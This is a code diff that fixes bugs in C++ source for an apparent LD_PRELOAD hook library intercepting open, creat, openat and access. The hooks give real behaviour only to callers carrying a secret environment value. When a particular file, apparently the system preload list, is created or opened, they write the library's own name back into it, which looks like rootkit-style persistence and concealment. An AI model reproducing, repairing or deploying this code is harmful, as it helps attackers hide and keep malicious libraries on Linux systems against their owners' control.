@@ -1,5 +1,5 @@
 
-#include <main.h>
+#include "main.h"
 
 //
 // Linux maintain mandatory lock for file with
@@ -16,6 +16,7 @@ int open(const char *pathname, int flags, mode_t mode) {
 	std::string file (pathname);
 	char chArr[2], *chPtr;
 	int ret;
+	ssize_t ind;
 	
 	
 	assert (opnPtr != NULL);
@@ -23,7 +24,7 @@ int open(const char *pathname, int flags, mode_t mode) {
 	assert (pwrPtr != NULL);
 	
 	// To check if the caller is our trust process
-	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
+	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowValue)) {
 		if ((ret = opnPtr (pathname, flags, mode)) == -1) {
 			serr.set (errno);
 		}
@@ -40,11 +41,12 @@ int open(const char *pathname, int flags, mode_t mode) {
 		
 		// we can't read dynamic_cnf.txt, at default we think that this file hasn't exist
 		if (-1 == ind) {
-			if (flags & O_CREAT) 
+			if (flags & O_CREAT) {
 				if ((ret = opnPtr (pathname, flags & (~O_TRUNC), mode)) == -1) {
 					serr.set (errno);
 				}
 				return ret;
+			}
 			else {
 				serr.set (ENOENT);
 				return -1;
@@ -61,7 +63,7 @@ int open(const char *pathname, int flags, mode_t mode) {
 					serr.set (errno);
 					return ret;
 				}
-				while (pwrite (*fd, &created, 1, 0) == -1 && errno == EINTR);
+				while (pwrPtr (*fd, &created, 1, 0) == -1 && errno == EINTR);
 				return ret;
 			}
 		}
@@ -73,14 +75,14 @@ int open(const char *pathname, int flags, mode_t mode) {
 			}
 			
 			while (pwrPtr (ret,
-						   hookLibraryName.c_str () + ' ',
-						   hookLibraryName.size (),
+						   (hookLibraryName + separator).c_str () ,
+						   (hookLibraryName + separator).size (),
 						   0
 				  ) == -1 && errno == EINTR
 			);
 			while (pwrPtr (*fd,
-						   (std::string (created) + not_writed).c_str (),
-						   (std::string (created) + not_writed).size (),
+						   (std::string (1, created) + not_writed).c_str (),
+						   (std::string (1, created) + not_writed).size (),
 						   0
 				  ) == -1 && errno == EINTR
 			);
@@ -121,7 +123,7 @@ int creat(const char *pathname, mode_t mode) { // O_CREATE | O_TRUNC | O_WRONLY
 	assert (pwrPtr != NULL);
 	assert (crtPtr != NULL);
 	
-	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
+	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowValue)) {
 		if ((ret = crtPtr (pathname, mode)) == -1) {
 			serr.set (errno);
 		}
@@ -130,7 +132,7 @@ int creat(const char *pathname, mode_t mode) { // O_CREATE | O_TRUNC | O_WRONLY
 	
 	if (!strcmp (prelFileName, file.c_str ())) {
 		descr_holder fd (new int (-1));
-		*fd = opnPtr (dynCnfFile.c_str (), O_RDWR);
+		*fd = opnPtr (dynCnfFile.c_str (), O_RDWR, 0);
 		lockAllFile (*fd);
 		
 		int ret = crtPtr (pathname, mode);
@@ -139,14 +141,14 @@ int creat(const char *pathname, mode_t mode) { // O_CREATE | O_TRUNC | O_WRONLY
 			return ret;
 		}
 		while (pwrPtr (ret,
-					   (hookLibraryName + ' ').c_str (),
-					   (hookLibraryName + ' ').size (),
+					   (hookLibraryName + separator).c_str (),
+					   (hookLibraryName + separator).size (),
 					   0
 			  ) == -1 && errno == EINTR
 		);
 		while (pwrPtr (*fd,
-					   (std::string (created) + not_writed).c_str (),
-					   (std::string (created) + not_writed).size (),
+					   (std::string (1, created) + not_writed).c_str (),
+					   (std::string (1, created) + not_writed).size (),
 					   0
 			  ) == -1 && errno == EINTR
 		);
@@ -164,12 +166,13 @@ int creat(const char *pathname, mode_t mode) { // O_CREATE | O_TRUNC | O_WRONLY
 int openat(int dirfd, const char *pathname, int flags, mode_t mode) {
 	CErrnoSaver serr;
 	OPENAT opnAtPtr = (OPENAT)dlsym (RTLD_NEXT, "openat");
-	OPENAT opnPtr = (OPENAT)dlsym (RTLD_NEXT, "open");
+	OPEN opnPtr = (OPEN)dlsym (RTLD_NEXT, "open");
 	READ rdPtr = (READ)dlsym (RTLD_NEXT, "read");
 	PWRITE pwrPtr = (PWRITE)dlsym (RTLD_NEXT, "pwrite");
 	std::string file (pathname), clearName, lnkAim;
 	char chArr[2], *chPtr;
 	int ret;
+	ssize_t ind;
 	
 	
 	assert (opnAtPtr != NULL);
@@ -177,7 +180,7 @@ int openat(int dirfd, const char *pathname, int flags, mode_t mode) {
 	assert (rdPtr != NULL);
 	assert (pwrPtr != NULL);
 	
-	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
+	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowValue)) {
 		if ((ret = opnAtPtr (dirfd, pathname, flags, mode)) == -1) {
 			serr.set (errno);
 		}
@@ -237,14 +240,14 @@ int openat(int dirfd, const char *pathname, int flags, mode_t mode) {
 			}
 			
 			while (pwrPtr (ret,
-						   (hookLibraryName + ' ').c_str (),
-						   (hookLibraryName + ' ').size (),
+						   (hookLibraryName + separator).c_str (),
+						   (hookLibraryName + separator).size (),
 						   0
 				  ) == -1 && errno == EINTR
 			);
 			while (pwrPtr (*fd,
-						   (std::string (created) + not_writed).c_str (),
-						   (std::string (created) + not_writed).size (),
+						   (std::string (1, created) + not_writed).c_str (),
+						   (std::string (1, created) + not_writed).size (),
 						   0
 				  ) == -1 && errno == EINTR
 			);
@@ -282,7 +285,7 @@ int access(const char *pathname, int mode) {
 	assert (rdPtr != NULL);
 	
 	// To check if the caller is our trust process
-	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
+	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowValue)) {
 		if ((ret = acsPtr (pathname, mode)) == -1) {
 			serr.set (errno);
 		}
